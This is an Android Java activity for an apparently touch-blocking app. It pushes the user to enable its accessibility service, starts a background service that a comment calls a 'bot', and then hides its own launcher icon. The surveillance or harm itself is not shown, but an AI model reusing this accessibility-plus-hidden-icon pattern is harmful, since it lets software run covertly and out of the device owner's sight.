package com.example.touchlock;

import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.provider.Settings;
import android.text.TextUtils;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if (!isAccessibilityServiceEnabled()) {
            Toast.makeText(this, "Включите Touch Blocker в Спец. возможностях", Toast.LENGTH_LONG).show();
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
        } else {
            // Запускаем основной сервис бота
            startService(new Intent(this, TouchLockService.class));
            
            // ПРЯЧЕМ ИКОНКУ ПРИЛОЖЕНИЯ
            hideAppIcon();
            
            Toast.makeText(this, "Защита активна. Иконка скрыта.", Toast.LENGTH_LONG).show();
            finish();
        }
    }

    private void hideAppIcon() {
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        getPackageManager().setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);
    }

    private boolean isAccessibilityServiceEnabled() {
        String service = getPackageName() + "/" + TouchLockAccessibilityService.class.getCanonicalName();
        String enabledServices = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
        return !TextUtils.isEmpty(enabledServices) && enabledServices.contains(service);
    }
}

